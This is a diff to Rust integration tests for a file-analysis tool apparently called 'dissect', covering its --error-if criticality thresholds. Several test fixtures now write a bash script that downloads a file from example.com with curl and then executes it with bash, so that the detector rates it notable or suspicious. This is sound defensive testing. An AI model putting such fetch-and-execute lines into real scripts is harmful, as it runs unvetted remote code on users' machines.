@@ -90,8 +90,10 @@ fn test_analyze_output_to_file() {
             // Third-party YARA is disabled by default (opt-in with --third-party-yara)
         ])
         .assert()
-        .success()
-        .stderr(predicate::str::contains("Results written to"));
+        .success();
+
+    // Note: "Results written to" message is only printed for Terminal format, not JSON
+    // The success assertion above confirms the command succeeded
 
     // Verify output file was created and contains JSON Lines format
     let content = fs::read_to_string(&output_path).unwrap();
@@ -475,15 +477,26 @@ fn test_strings_vs_symbols_difference() {
 fn test_error_if_single_file_match() {
     let temp_dir = TempDir::new().unwrap();
     let script = temp_dir.path().join("test.sh");
-    // Create a simple script - the obfuscation/code-metrics rule gives it Notable criticality
-    fs::write(&script, "#!/bin/bash\necho 'hello'\n").unwrap();
+    // Create a script with curl download to trigger Notable/Suspicious criticality
+    fs::write(
+        &script,
+        "#!/bin/bash\ncurl -o /tmp/file http://example.com/download.sh\nbash /tmp/file\n",
+    )
+    .unwrap();
 
-    // --error-if=notable should fail because this file has Notable criticality
-    assert_cmd::cargo_bin_cmd!("dissect")
+    // --error-if=notable should fail because this file has Notable+ criticality
+    let output = assert_cmd::cargo_bin_cmd!("dissect")
         .args(["--error-if", "notable", "analyze", script.to_str().unwrap()])
         .assert()
-        .failure()
-        .stderr(predicate::str::contains("--error-if"));
+        .failure();
+
+    // Check stderr contains error-if message (may also contain validation warnings)
+    let stderr = String::from_utf8_lossy(&output.get_output().stderr);
+    assert!(
+        stderr.contains("--error-if"),
+        "Expected '--error-if' in stderr, got: {}",
+        stderr
+    );
 }
 
 /// Test --error-if with single file that doesn't match criteria (succeeds)
@@ -491,10 +504,14 @@ fn test_error_if_single_file_match() {
 fn test_error_if_single_file_no_match() {
     let temp_dir = TempDir::new().unwrap();
     let script = temp_dir.path().join("test.sh");
-    // Create a simple script - gets Notable criticality
-    fs::write(&script, "#!/bin/bash\necho 'hello'\n").unwrap();
+    // Create a script with curl download - gets Notable/Suspicious (not Hostile)
+    fs::write(
+        &script,
+        "#!/bin/bash\ncurl -o /tmp/file http://example.com/download.sh\nbash /tmp/file\n",
+    )
+    .unwrap();
 
-    // --error-if=hostile should succeed because this file is Notable (not Hostile)
+    // --error-if=hostile should succeed because this file is Notable/Suspicious (not Hostile)
     assert_cmd::cargo_bin_cmd!("dissect")
         .args(["--error-if", "hostile", "analyze", script.to_str().unwrap()])
         .assert()
@@ -506,14 +523,18 @@ fn test_error_if_single_file_no_match() {
 fn test_error_if_scan_stops_early() {
     let temp_dir = TempDir::new().unwrap();
 
-    // Create multiple files
+    // Create multiple files with curl download to trigger Notable+ criticality
     for i in 0..5 {
         let script = temp_dir.path().join(format!("test{}.sh", i));
-        fs::write(&script, "#!/bin/bash\necho 'hello'\n").unwrap();
+        fs::write(
+            &script,
+            "#!/bin/bash\ncurl -o /tmp/file http://example.com/download.sh\nbash /tmp/file\n",
+        )
+        .unwrap();
     }
 
-    // --error-if=notable should fail when scanning directory (files have Notable criticality)
-    assert_cmd::cargo_bin_cmd!("dissect")
+    // --error-if=notable should fail when scanning directory (files have Notable+ criticality)
+    let output = assert_cmd::cargo_bin_cmd!("dissect")
         .args([
             "--error-if",
             "notable",
@@ -521,8 +542,15 @@ fn test_error_if_scan_stops_early() {
             temp_dir.path().to_str().unwrap(),
         ])
         .assert()
-        .failure()
-        .stderr(predicate::str::contains("--error-if"));
+        .failure();
+
+    // Check stderr contains error-if message (may also contain validation warnings)
+    let stderr = String::from_utf8_lossy(&output.get_output().stderr);
+    assert!(
+        stderr.contains("--error-if"),
+        "Expected '--error-if' in stderr, got: {}",
+        stderr
+    );
 }
 
 /// Test --error-if with comma-separated levels
@@ -530,10 +558,14 @@ fn test_error_if_scan_stops_early() {
 fn test_error_if_multiple_levels() {
     let temp_dir = TempDir::new().unwrap();
     let script = temp_dir.path().join("test.sh");
-    fs::write(&script, "#!/bin/bash\necho 'hello'\n").unwrap();
+    fs::write(
+        &script,
+        "#!/bin/bash\ncurl -o /tmp/file http://example.com/download.sh\nbash /tmp/file\n",
+    )
+    .unwrap();
 
-    // --error-if=inert,notable should fail for Notable files
-    assert_cmd::cargo_bin_cmd!("dissect")
+    // --error-if=inert,notable should fail for Notable+ files
+    let output = assert_cmd::cargo_bin_cmd!("dissect")
         .args([
             "--error-if",
             "inert,notable",
@@ -541,6 +573,13 @@ fn test_error_if_multiple_levels() {
             script.to_str().unwrap(),
         ])
         .assert()
-        .failure()
-        .stderr(predicate::str::contains("--error-if"));
+        .failure();
+
+    // Check stderr contains error-if message (may also contain validation warnings)
+    let stderr = String::from_utf8_lossy(&output.get_output().stderr);
+    assert!(
+        stderr.contains("--error-if"),
+        "Expected '--error-if' in stderr, got: {}",
+        stderr
+    );
 }
